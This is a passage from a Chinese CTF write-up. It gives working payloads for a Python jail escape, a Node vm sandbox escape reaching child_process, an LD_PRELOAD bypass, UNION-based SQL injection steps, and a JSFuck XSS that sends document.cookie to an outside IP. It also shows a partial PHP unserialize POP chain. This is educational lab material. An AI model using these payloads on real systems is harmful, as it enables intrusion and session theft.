print(r.text) 有点需要注意的的地方是 需要先判断answer是否在r.cookies 不然会报错 JailFamilyPackagepython沙盒 源码： 12345678910111213141516171819#! /usr/bin/python3#-*- coding:utf-8 -*-if __name__ == &quot;__main__&quot;: print(&quot;This is a pyjail lite, have fun xD&quot;) print(open(__file__).read()) print(&quot;RUN&quot;) try: while True: text = input(&#x27;&gt;&gt;&gt; &#x27;) print(text) safe = True for keyword in [&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;import&#x27;, &#x27;open&#x27;, &#x27;os&#x27;, &#x27;read&#x27;, &#x27;system&#x27;, &#x27;write&#x27;]: if keyword in text: print(&quot;No!!!&quot;) safe = False if safe: exec(text) except: pass 自己多测测就知道了 目标是python3.6 payload: 1print(().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__[&#x27;sys&#x27;+&#x27;tem&#x27;](&#x27;cat /flag&#x27;)) 然后得到： 123很遗憾, 但是flag不在这里~ssh nodejs@server.com -p 2222password: nodejsqwqwqwq nodejs沙盒： 12345678910111213141516171819202122const vm = require(&#x27;vm&#x27;);const readline = require(&#x27;readline&#x27;);console.log(&quot;Hint: &quot;)console.log(require(&quot;fs&quot;).readFileSync(&quot;/app.js&quot;).toString())const context = vm.createContext(&#123;&#125;);var rl = readline.createInterface(&#123; input: process.stdin, output: process.stdout, terminal: false&#125;);process.stdout.write(&quot;&gt; &quot;);rl.on(&#x27;line&#x27;, function(line)&#123; try &#123; console.log(vm.runInContext(line, context)); &#125; catch (e) &#123; console.log(e) &#125; process.stdout.write(&quot;&gt; &quot;);&#125;) vm和vm2是不安全的模块 构造payload: 1const process = this.constructor.constructor(&#x27;return this.process&#x27;)();process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString(); 得到： 1234恭喜! 你离flag很近了![狗头]ssh final@server.com -p 2222password: longlone_wants_a_gf 进入是个linux的终端 发现env里有 1LD_PRELOAD&#x3D;libfakeroot-sysv.so:libfakechroot.so 把LD_PRELOAD设置成空 12export LD_PRELOAD&#x3D;&#39;&#39;cat &#x2F;flag 带恶人六撞sql注入 order by 判断4列 1?id&#x3D;-1&#39; order by 4%23 联合查询 判断回显位 1?id&#x3D;-1&#39; union select 1,2,3,4%23 查表 1?id&#x3D;-1&#39; union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())%23 查列 1?id&#x3D;-1&#39; union select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;fllllag&#39;)%23 查数据 1?id&#x3D;-1&#39; union select 1,2,3,(select group_concat(fllllllag) from fllllag)%23 告白网站xss 测试过滤了 1&#x3D; &amp; . &#39; &quot; 并且下面没有过滤 直接可以用jsfuck:http://www.jsfuck.com 1[] ! + () 直接script标签就行 构造类似下面的 注意url编码: 1&lt;script&gt;[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()+[])[!+[]+!+[]+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[!+[]+!+[]]+[+!+[]]+[+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+[+[]]+[+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]])+[])[!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]](+[![]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]])&lt;/script&gt; 意思就是： 1&lt;script&gt;location=&quot;http://1.1.1.1:9000/&quot;+document.cookie;&lt;/script&gt; 服务端监听就行 AFKL源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 &lt;?phperror_reporting(0);class pop&#123; public $aaa; public static $bbb = false; public function __wakeup() &#123; //Do you know CVE? echo &quot;The class pop should never be serialized.&quot;; $this-&gt;aaa = NULL; &#125; public function __destruct() &#123; for ($i=0; $i&lt;2; $i++) &#123; if (self::$bbb) &#123; $this-&gt;aaa[1]($this-&gt;aaa[2]); &#125; else &#123; self::$bbb = call_user_func($this-&gt;aaa[&quot;object&quot;]); &#125; &#125; &#125;&#125;class chain&#123; private $AFKL; protected function getAFKL() &#123; return $this-&gt;AFKL; &#125;&#125;class epic extends chain&#123; public $aaa; public static $bbb = false; public function __invoke() &#123; return self::$bbb; &#125; public function __call($name, $params) &#123; return $this-&gt;aaa-&gt;$name($params); &#125;&#125;if (isset($_GET[&quot;code&quot;])) &#123; unserialize(base64_decode($_GET[&quot;code&quot;]));&#125; else &#123; highlight_file(__FILE__);&#125; 后面的类没用到 又学到了知识点： php中this和self的区别是：self调用的是类，而$this调用的是实例化的对象。self可以访问本类中的静态属性和静态方法，以及const定义的常量，this可以调用本类中的方法和属性。 绕过__wakeup就不用说了 关键代码 12345678910public function __destruct()&#123; for ($i=0; $i&lt;2; $i++) &#123; if (self::$bbb) &#123; $this-&gt;aaa[1]($this-&gt;aaa[2]); &#125; else &#123; self::$bbb = call_user_func($this-&gt;aaa[&quot;object&quot;]); &#125; &#125;&#125; 只需call_user_func返回true 就能修改self::$bbb的值了 1234567891011121314&lt;?phpclass pop&#123; public $aaa; public static $bbb; public function __construct() &#123; $this-&gt;aaa =array(1=&gt;&#x27;system&#x27;,2=&gt;&#x27;cat 